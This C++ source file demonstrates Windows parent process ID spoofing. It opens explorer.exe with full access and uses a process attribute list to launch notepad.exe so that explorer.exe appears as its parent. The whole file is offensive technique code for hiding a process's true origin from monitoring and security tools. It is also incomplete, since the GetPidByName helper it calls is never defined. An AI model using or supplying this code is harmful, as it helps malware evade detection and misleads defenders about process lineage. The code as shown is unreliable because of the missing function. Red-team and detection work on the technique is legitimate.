// Filename: spoofed_ppid.cpp
// Purpose: Spawn process with spoofed parent using attribute list
// Author: Joas A Santos

#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFOEX siex = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    siex.StartupInfo.cb = sizeof(STARTUPINFOEX);

    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPidByName(L"explorer.exe"));
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &siex.StartupInfo, &pi);

    DeleteProcThreadAttributeList(siex.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

    return 0;
}
